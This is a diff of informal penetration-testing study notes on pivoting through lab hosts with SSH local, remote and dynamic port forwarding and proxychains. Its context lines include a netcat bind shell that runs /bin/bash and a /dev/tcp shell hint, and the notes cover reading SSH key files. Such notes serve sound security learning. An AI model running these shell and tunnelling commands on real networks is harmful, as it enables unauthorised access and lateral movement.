@@ -534,20 +534,86 @@ nc -lp 3333 -e /bin/bash
 
 if the box doesn't have netcat you can use /dev/tcp/10.2.0.2/1111
 
+SSH Tunneling 
+
+Secure SHell (SSH)
+ - provides authentication, encryption and integrity
+ - rsh, replaced with ssh, provides a channel for running a shell on a remote computer
+
+ SSH Port Forwarding
+ - cat . ssh/authorized_keys
+
+ - .ssh/known_host
+
+ - ls //etc/ssh for key_info
+
+SSH Port Fowarding 
+
+ihost@ihost-hostname | toby@tobyhostname | john@john-hostname | carlton@carlton-hostname 
+
+ssh <user>@<hostname or ip> -L <port>:<Target hostname or ip>:<Target Port>
+
+if usng alternate ssh port 
+
+ssh -p <port> <user>@<hostname or ip> -L <port>:<Target hostname or ip>:<Target Port>
+
+
+ssh toby@toby-host -L 17200:127.0.0.1:80
+Authenticationg to toby machine, opening a random high port on our machine and loopback ip to port 80 which fowards and receives traffic on port 80 on toby host
+
+
+ssh 127.0.0.1:17200
+
+3 Host port fowarding 
+ssh toby@toby-host -L 17200:<john-host ip>:1111
+open a port on our local machine (17200), and we want to forward traffic (not authenticate) to ssh port 1111 on john 
+ssh -p 17200 john@127.0.0.1
+test port foward for john
+jhost maybe?
+
+4 host port fowarding 
+ssh -p 17200 john@127.0.0.1 -L 17201:<Carlton IP>:23
+puts on the Carlton IP
+telnet 127.0.0.1 17201
+Test for Carlton
+
+SSH Remote Port Fowarding
+
+chost>
+ssh john@john-host -p 1111 -R 17299:127.0.0.1:3443 -NT
+
+ssh -p 17200 john@127.0.0.1
+jhost> ssh -p 17299 carlton@127.0.0.1
+
+chost> 
+
+ihost> ssh -p 17200 john@127.0.0.1 -L 17202:127.0.0.1:3443 -NT 
+
+ihost> ssh -p 17202 carlton@127.0.0.1
+chost>
 
 
 
+-NT at the end makes it a non interactive shell so you can't type anything to close the port forward
+ssh john@ip -L 17200:Mike IP:22
+ssh -p 17200 mike@127.0.0.1
 
 
+SSH DYNAMIC PORT FOWARDING
+###cannot create ssh tunnels with any other port besides ssh###
+ihost> ssh -p 17202 carlton@127.0.0.1 -D 9050 -NT
 
+ihost> proxychains ./Net_scan.sh 
+or
+ihost> proxychains nmap
+or
+ihost> proxychains wget -r jez-host
+or 
+ihost> proxychains ftp
+or
+ihost> prxoychains telnet or ssh possible for quick telnet or ssh otherwise don't run
 
-
-
-
-
-
-
-
+etc/proxychains.conf for ip
 
 
 
